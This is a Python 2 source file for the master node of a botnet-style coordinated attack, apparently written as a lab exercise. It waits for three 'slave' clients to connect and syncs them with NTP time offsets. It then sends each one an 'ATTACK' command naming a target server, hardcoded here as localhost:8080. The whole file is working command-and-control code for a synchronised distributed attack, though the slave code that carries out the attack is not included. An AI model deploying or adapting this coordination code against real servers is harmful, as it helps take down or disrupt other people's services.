import time, datetime, sys, re,ntplib
from socket import *  #importing the socket library for network connections
from time import ctime

class Master():
  def __init__(self, sock=None):
    if sock is None:
      self.sock = socket(AF_INET, SOCK_STREAM)
    else:
      self.sock = sock
    self.slaves = {}

    # The server to be attacked
    self.server_ip = 'localhost'
    self.server_port = 8080

    # get ntp times
    self.ntpc = ntplib.NTPClient()
    self.ntp_res = self.ntpc.request('europe.pool.ntp.org', version=3)

  def listenConnections(self, port):
    print "Listening for connections"
    self.sock.bind(('localhost', port))
    self.sock.listen(3)

  def acceptConnections(self):
    conn, addr = self.sock.accept()
    print('Accepting connection {0}'.format(addr))
    print('Conn is {0}'.format(conn))
    msg_buf = conn.recv(64)
    if len(msg_buf) > 0:
      print(msg_buf)
    conn.send('Master offset is: {0}'.format(self.ntp_res.offset))
    self.slaves[addr] = conn

  def launchAttack(self):
    # get ntp times
    ntpc = ntplib.NTPClient()
    ntp_res = ntpc.request('europe.pool.ntp.org', version=3)
    for slave_addr, conn in self.slaves.iteritems():
      conn.send('ATTACK {0} {1} {2}'.format(self.server_ip, self.server_port, ntp_res.offset))

  def closeConnection(self):
    self.sock.close()

if __name__ == '__main__':
    port = 8081
    masterServer = Master()
    masterServer.listenConnections(port)
    while 1:
      masterServer.acceptConnections()
      if len(masterServer.slaves) >= 3:
        break
    masterServer.launchAttack()
    masterServer.closeConnection()
